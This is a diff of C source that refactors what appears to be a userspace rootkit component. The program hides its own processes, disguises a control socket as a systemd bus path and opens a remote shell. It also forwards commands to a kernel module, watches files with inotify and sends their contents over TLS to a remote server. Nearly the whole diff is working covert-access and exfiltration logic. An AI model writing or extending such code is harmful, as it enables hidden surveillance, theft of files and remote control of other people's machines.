@@ -44,12 +44,19 @@
 #define SHELL_SOCK_PATH ("/run/systemd/system/bus")
 #endif
 
-int conn_sock;
-
 struct inot_watch {
     int wd;
     char name[NAME_MAX + 1];
 };
+
+int conn_sock = -1;
+int remote_shell_sock = -1;
+int local_socks[2];
+
+int inot_fd = -1;
+int inot_epoll = -1;
+struct inot_watch inot_wds[8192];
+size_t inot_watch_count = 0;
 
 /*
  * function:
@@ -279,6 +286,180 @@ void promote_child(void) {
     setsid();
 }
 
+void add_read_socket_epoll(int efd, int sock) {
+    struct epoll_event ev;
+    ev.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
+    ev.data.fd = sock;
+    add_epoll_socket(efd, sock, &ev);
+}
+
+void epoll_event_loop(SSL* ssl) {
+    unsigned char buffer[MAX_PAYLOAD];
+    int efd = create_epoll_fd();
+    struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
+
+    add_read_socket_epoll(efd, conn_sock);
+    add_read_socket_epoll(efd, remote_shell_sock);
+    add_read_socket_epoll(efd, local_socks[0]);
+
+    hide_proc();
+
+    for (;;) {
+        int n = wait_for_epoll_event(efd, eventList);
+        //n can't be -1 because the handling for that is done in wait_for_epoll_event
+        assert(n != -1);
+        for (int i = 0; i < n; ++i) {
+            if (eventList[i].events & EPOLLERR || eventList[i].events & EPOLLHUP) {
+                fprintf(stderr, "Sock error\n");
+                close(eventList[i].data.fd);
+            } else if (eventList[i].events & EPOLLIN) {
+                int size;
+                while ((size = read(eventList[i].data.fd, buffer, MAX_PAYLOAD)) > 0) {
+                    printf("Read %d bytes\n", size);
+                    printf("Wrote %d bytes to server\n", size);
+                    SSL_write(ssl, buffer, size);
+                }
+                if (size == 0) {
+                    goto done;
+                }
+                if (size == -1) {
+                    if (errno != EAGAIN) {
+                        perror("read");
+                        goto done;
+                    }
+                }
+            }
+        }
+    }
+done:
+    free(eventList);
+}
+
+void handle_inotify_create(struct inotify_event* ie) {
+    printf("%s was created\n", ie->name);
+    int wd;
+    if ((wd = inotify_add_watch(inot_fd, ie->name, IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED)) < 0) {
+        perror("inotify_add_watch create");
+        exit(EXIT_FAILURE);
+    }
+    //Save watch descriptor
+    inot_wds[inot_watch_count].wd = wd;
+    strcpy(inot_wds[inot_watch_count].name, ie->name);
+    ++inot_watch_count;
+}
+
+void handle_inotify_ignore(struct inotify_event* ie, int i) {
+    for (size_t j = 0; j < inot_watch_count; ++j) {
+        if (inot_wds[j].wd == ie->wd) {
+            //Found the watch descriptor, re-add it
+            int wd;
+
+            if ((wd = inotify_add_watch(
+                         inot_fd, inot_wds[i].name, IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
+                    < 0) {
+                perror("read inotify_add_watch");
+                exit(EXIT_FAILURE);
+            }
+
+            //Save watch descriptor
+            inot_wds[j].wd = wd;
+        }
+    }
+}
+
+int handle_inotify_modified(struct inotify_event* ie) {
+    printf("%s was modified\n", ie->name);
+    const char* file_name = NULL;
+    if (ie->len > 0) {
+        //We have a name
+        file_name = ie->name;
+    } else {
+        //Retrieve the name
+        for (size_t j = 0; j < inot_watch_count; ++j) {
+            if (inot_wds[j].wd == ie->wd) {
+                //Found our name
+                file_name = inot_wds[j].name;
+                break;
+            }
+        }
+    }
+    if (!file_name) {
+        printf("Failed to get filename for the modified file\n");
+        return -1;
+    }
+    //Time to write the file contents to the server
+    FILE* f = fopen(file_name, "r");
+    if (!f) {
+        fprintf(stderr, "%s\n", file_name);
+        perror("inotify fopen");
+        return -1;
+    }
+    fseek(f, 0, SEEK_END);
+    size_t file_size = ftell(f);
+    rewind(f);
+
+    unsigned char* file_buffer = malloc(file_size + 1);
+    file_buffer[0] = 'f';
+    if (!fread(file_buffer + 1, 1, file_size, f)) {
+        perror("fread");
+        return -1;
+    }
+    //Write to server via local socket listening in epoll
+    write(local_socks[1], file_buffer, file_size);
+    printf("Wrote to the server\n");
+    return 0;
+}
+
+void unwatch_inotify(void) {
+    //Unregister all inotify handles here
+    for (size_t i = 0; i < inot_watch_count; ++i) {
+        inotify_rm_watch(inot_fd, inot_wds[i].wd);
+    }
+    inot_watch_count = 0;
+}
+
+void inotify_event_loop(void) {
+    unsigned char buffer[MAX_PAYLOAD];
+
+    add_read_socket_epoll(inot_epoll, inot_fd);
+
+    struct epoll_event* event_list = calloc(100, sizeof(struct epoll_event));
+
+    unsigned char buf[sizeof(struct inotify_event) + NAME_MAX + 1];
+    struct inotify_event* ie = (struct inotify_event*) buf;
+
+    for (;;) {
+        int n = wait_for_epoll_event(inot_epoll, event_list);
+        for (int i = 0; i < n; ++i) {
+            int s;
+        empty_inotify:
+            errno = 0;
+            s = read(inot_fd, buf, sizeof(buf));
+            if (s < 0 && errno != EAGAIN) {
+                perror("inotify_epoll_read");
+                exit(EXIT_FAILURE);
+            }
+            if (errno == EAGAIN) {
+                break;
+            }
+            //handle updated log file
+            if (ie->mask & IN_CLOSE_WRITE || ie->mask & IN_ATTRIB) {
+                if (handle_inotify_modified(ie) < 0) {
+                    continue;
+                }
+            } else if (ie->mask & IN_CREATE) {
+                handle_inotify_create(ie);
+            } else if (ie->mask & IN_IGNORED) {
+                handle_inotify_ignore(ie, i);
+            }
+            memset(buffer, 0, sizeof(struct inotify_event) + NAME_MAX + 1);
+            goto empty_inotify;
+        }
+    }
+
+    free(event_list);
+}
+
 /*
  * function:
  *    main
@@ -325,10 +506,8 @@ int main(void) {
 
     int remote_sock = create_remote_socket();
 
-    int inot_fd = create_inotify_descriptor();
-    int inot_epoll = create_epoll_fd();
-    struct inot_watch inot_wds[8192];
-    size_t inot_watch_count = 0;
+    inot_fd = create_inotify_descriptor();
+    inot_epoll = create_epoll_fd();
 
     SSL* ssl = SSL_new(ctx);
     SSL_set_fd(ssl, remote_sock);
@@ -339,14 +518,6 @@ int main(void) {
     }
 
     unsigned char buffer[MAX_PAYLOAD];
-    int remote_shell_sock = -1;
-
-    int local_socks[2];
-
-    if (socketpair(AF_UNIX, SOCK_STREAM, 0, local_socks) < 0) {
-        perror("socketpair");
-        exit(EXIT_FAILURE);
-    }
 
     if (!wrapped_fork()) {
         run_remote_shell();
@@ -362,58 +533,14 @@ int main(void) {
 
     promote_child();
 
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, local_socks) < 0) {
+        perror("socketpair");
+        exit(EXIT_FAILURE);
+    }
+
     if (!wrapped_fork()) {
         promote_child();
-
-        int efd = create_epoll_fd();
-        struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
-
-        struct epoll_event ev;
-        ev.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
-        ev.data.fd = conn_sock;
-        add_epoll_socket(efd, conn_sock, &ev);
-        struct epoll_event eve;
-        eve.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
-        eve.data.fd = remote_shell_sock;
-        add_epoll_socket(efd, remote_shell_sock, &eve);
-        struct epoll_event even;
-        eve.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
-        eve.data.fd = local_socks[0];
-        add_epoll_socket(efd, local_socks[0], &even);
-
-        //sleep(3);
-
-        hide_proc();
-
-        for (;;) {
-            int n = wait_for_epoll_event(efd, eventList);
-            //n can't be -1 because the handling for that is done in wait_for_epoll_event
-            assert(n != -1);
-            for (int i = 0; i < n; ++i) {
-                if (eventList[i].events & EPOLLERR || eventList[i].events & EPOLLHUP) {
-                    fprintf(stderr, "Sock error\n");
-                    close(eventList[i].data.fd);
-                } else if (eventList[i].events & EPOLLIN) {
-                    int size;
-                    while ((size = read(eventList[i].data.fd, buffer, MAX_PAYLOAD)) > 0) {
-                        printf("Read %d bytes\n", size);
-                        printf("Wrote %d bytes to server\n", size);
-                        SSL_write(ssl, buffer, size);
-                    }
-                    if (size == 0) {
-                        goto done;
-                    }
-                    if (size == -1) {
-                        if (errno != EAGAIN) {
-                            perror("read");
-                            goto done;
-                        }
-                    }
-                }
-            }
-        }
-    done:
-        free(eventList);
+        epoll_event_loop(ssl);
     } else {
         setsid();
 
@@ -456,11 +583,7 @@ int main(void) {
                         strcpy(inot_wds[inot_watch_count].name, (char*) (buffer + 7));
                         ++inot_watch_count;
                     } else if (strncmp("unwatch", (char*) (buffer + 1), 7) == 0) {
-                        //Unregister all inotify handles here
-                        for (size_t i = 0; i < inot_watch_count; ++i) {
-                            inotify_rm_watch(inot_fd, inot_wds[i].wd);
-                        }
-                        inot_watch_count = 0;
+                        unwatch_inotify();
                     } else {
                         printf("Wrote %d to kernel module\n", size);
                         write(conn_sock, buffer + 1, size - 1);
@@ -475,111 +598,7 @@ int main(void) {
         } else {
             setsid();
             hide_proc();
-
-            //Handle inotify stuffs here
-            struct epoll_event ev;
-            ev.data.fd = inot_fd;
-            ev.events = EPOLLIN | EPOLLET;
-
-            add_epoll_socket(inot_epoll, inot_fd, &ev);
-
-            struct epoll_event* event_list = calloc(100, sizeof(struct epoll_event));
-
-            unsigned char buf[sizeof(struct inotify_event) + NAME_MAX + 1];
-            struct inotify_event* ie = (struct inotify_event*) buf;
-
-            for (;;) {
-                int n = wait_for_epoll_event(inot_epoll, event_list);
-                for (int i = 0; i < n; ++i) {
-                    int s;
-                empty_inotify:
-                    errno = 0;
-                    s = read(inot_fd, buf, sizeof(buf));
-                    if (s < 0 && errno != EAGAIN) {
-                        perror("inotify_epoll_read");
-                        exit(EXIT_FAILURE);
-                    }
-                    if (errno == EAGAIN) {
-                        break;
-                    }
-                    //handle updated log file
-                    if (ie->mask & IN_CLOSE_WRITE || ie->mask & IN_ATTRIB) {
-                        printf("%s was modified\n", ie->name);
-                        const char* file_name = NULL;
-                        if (ie->len > 0) {
-                            //We have a name
-                            file_name = ie->name;
-                        } else {
-                            //Retrieve the name
-                            for (size_t j = 0; j < inot_watch_count; ++j) {
-                                if (inot_wds[j].wd == ie->wd) {
-                                    //Found our name
-                                    file_name = inot_wds[j].name;
-                                    break;
-                                }
-                            }
-                        }
-                        if (!file_name) {
-                            printf("Failed to get filename for the modified file\n");
-                            continue;
-                        }
-                        //Time to write the file contents to the server
-                        FILE* f = fopen(file_name, "r");
-                        if (!f) {
-                            fprintf(stderr, "%s\n", file_name);
-                            perror("inotify fopen");
-                            continue;
-                        }
-                        fseek(f, 0, SEEK_END);
-                        size_t file_size = ftell(f);
-                        rewind(f);
-
-                        unsigned char *file_buffer = malloc(file_size + 1);
-                        file_buffer[0] = 'f';
-                        if (!fread(file_buffer + 1, 1, file_size, f)) {
-                            perror("fread");
-                            continue;
-                        }
-                        //Write to server via local socket listening in epoll
-                        write(local_socks[1], file_buffer, file_size);
-                        printf("Wrote to the server\n");
-                    } else if (ie->mask & IN_CREATE) {
-                        printf("%s was created\n", ie->name);
-                        int wd;
-                        if ((wd = inotify_add_watch(
-                                     inot_fd, ie->name, IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
-                                < 0) {
-                            perror("inotify_add_watch create");
-                            exit(EXIT_FAILURE);
-                        }
-                        //Save watch descriptor
-                        inot_wds[inot_watch_count].wd = wd;
-                        strcpy(inot_wds[inot_watch_count].name, ie->name);
-                        ++inot_watch_count;
-                    } else if (ie->mask & IN_IGNORED) {
-                        for (size_t j = 0; j < inot_watch_count; ++j) {
-                            if (inot_wds[j].wd == ie->wd) {
-                                //Found the watch descriptor, re-add it
-                                int wd;
-
-                                if ((wd = inotify_add_watch(inot_fd, inot_wds[i].name,
-                                             IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
-                                        < 0) {
-                                    perror("read inotify_add_watch");
-                                    exit(EXIT_FAILURE);
-                                }
-
-                                //Save watch descriptor
-                                inot_wds[j].wd = wd;
-                            }
-                        }
-                    }
-                    memset(buffer, 0, sizeof(struct inotify_event) + NAME_MAX + 1);
-                    goto empty_inotify;
-                }
-            }
-
-            free(event_list);
+            inotify_event_loop();
         }
     }
 
